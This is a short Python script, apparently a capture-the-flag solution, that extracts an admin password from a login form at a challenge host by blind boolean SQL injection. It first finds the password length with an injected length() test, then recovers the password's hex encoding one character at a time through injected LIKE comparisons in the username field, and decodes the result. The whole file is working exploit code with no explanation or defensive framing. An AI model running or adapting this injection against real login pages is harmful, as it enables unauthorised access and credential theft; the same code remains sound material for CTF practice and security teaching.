#!/usr/bin/env python3

import requests
import re
#from string import ascii_lowercase, digits, ascii_uppercase, punctuation
from binascii import unhexlify

patt = re.compile('LLS{.*?}')

s = requests.session()

url = "http://jh2i.com:50011/"

r = s.get(url)

def get_len():
    payload = "admin' and length(password)={} -- "
    data = {}
    data['password'] = 'whatevs'
    for i in range(70):
        data['username'] = payload.format(i)
        r = requests.post(url, data=data)
        if 'Good job' in r.text:
            return(i)



length = get_len()

print('Length of password is', length)

username = "admin' and hex(password) like '{}%' -- "
password = "whatevs"

known = ""

hexchars = "0123456789abcdef"

while len(known) != length*2:
    for c in hexchars:
        creds = {'username':username.format(known+c), 'password':password}
        r = s.post(url, data=creds)
        if 'Good job' in r.text:
            known += c
            print("known",known)
            break

print(unhexlify(known).decode())
